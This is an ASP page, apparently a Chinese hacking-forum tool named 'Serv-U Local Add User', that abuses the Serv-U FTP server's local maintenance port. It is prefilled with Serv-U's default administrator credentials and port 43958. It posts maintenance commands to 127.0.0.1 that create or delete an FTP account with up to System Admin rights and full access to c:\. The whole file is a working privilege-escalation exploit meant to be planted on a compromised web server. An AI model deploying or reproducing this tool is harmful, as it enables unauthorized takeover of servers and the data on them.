<title>Serv-U TOOL</title>
<style type="text/css">
body { 
background-color: #333333;
}
a:hover {text-decoration: none;color: #FF0000;}
a:active {text-decoration: none;color: #FF0000;}
.buttom {
	color: #333333;
	border: 1px solid #000000
#;
}
.TextBox {border: 1px solid #084B8E}
body,td,th {
	color: #CCCCCC;
}
</style>
 <p align="center">Serv-U Local Add User with ASP</p>
 <p align="center">Author: Xiao.K</p>
 <form name="form1" method="post" action="">
  <p align="center">
   ------------------Serv-U Information------------------
   <br>
  user:
    <input name="duser" type="text" class="TextBox" id="duser" value="LocalAdministrator">
    <br>
    pwd :
    <input name="dpwd" type="text" class="TextBox" id="dpwd" value="#l@$ak#.lk;0@P">
    <br>
  port:
  <input name="dport" type="text" class="TextBox" id="dport" value="43958">
  <br>
  ---------------------Add User!!! ---------------------
  <BR>
 Domain: &nbsp; 
  <input name="domain" type="text" class="TextBox" id="domain" value="secdst" />
  <br>
  FTP USER:
  <input name="fuser" type="text" class="TextBox" id="fuser" value="xiaok">
  <br>
  FTP PASS:
  <input name="fpass" type="text" class="TextBox" id="fpass" value="bbs.secdst.net">
  <br>
  FTP PORT:
  <input name="fport" type="text" class="TextBox" id="fport" value="21">
  <br>
  FTP PATH:
  <input name="fpath" type="text" class="TextBox" id="fpath" value="c:\\">
  <br>
  Privilege
  <select para=value name="privilege">
	<option value=2>Read-only Admin</option>
    <option value=3>Group Admin</option>
    <option value=4>Domain Admin</option>
    <option value=5>System Admin</option>
</select>
  </p>
  <p align="center">
    
    
    <input name="radiobutton" type="radio" value="add" checked class="TextBox">
    Add User 
    <input type="radio" name="radiobutton" value="del" class="TextBox"> 
    Del User </p>
  <p align="center">
    <input name="Submit" type="submit" class="buttom" value="Run" />
  </p>
</form>
   <%
user = request.Form("duser")
pass = request.Form("dpwd")
port = request.Form("dport")
domain = request.Form("domain")
fuser = request.Form("fuser")
fpass = request.Form("fpass")
fport = request.Form("fport")
fpath = request.Form("fpath")
privilege=request.Form("privilege")
select case privilege
   case 2:
  privilege="ReadOnly"
   case 3:
  privilege="Group"
   case 4:
  privilege="Domain"
   case 5:
  privilege="System"
  end select
	if request.Form("radiobutton") = "add" Then

loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=" & domain &"|0.0.0.0|" & fport & "|-1|1|0" & vbCrLf & "-DynDNSEnable=0" & vbCrLf & "  DynIPName=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & fport & vbCrLf & "-User="& fuser & vbCrLf & "-Password=" & fpass & vbCrLf & _
        "-HomeDir=" & fpath & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=" & privilege  & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=" & fpath &"|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf		
		'--------
		'On Error Resume Next
		Set xPost = CreateObject("Microsoft.XMLHTTP")
		xPost.Open "POST", "http://127.0.0.1:"& port &"/secdst",True, "", ""
		xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit
		Set xPost =nothing
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &"</div>"
	elseif request.Form("radiobutton") = "del" Then
	
		loginuser = "User " & user & vbCrLf
		loginpass = "Pass " & pass & vbCrLf
		mt = "SITE MAINTENANCE" & vbCrLf
		deluser =  "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & port & vbcrlf & " User="& fuser & vbcrlf
		quit = "QUIT" & vbCrLf	
		Set xPost3 = CreateObject("MSXML2.XMLHTTP")
		xPost3.Open "POST", "http://127.0.0.1:"& port &"/secdst", True
		xPost3.Send loginuser & loginpass & mt & deluser & quit 
		Set xPOST3=nothing
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &" have deleted</div>"
	else
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">let's Start!!!</div>"
	end if


%>
 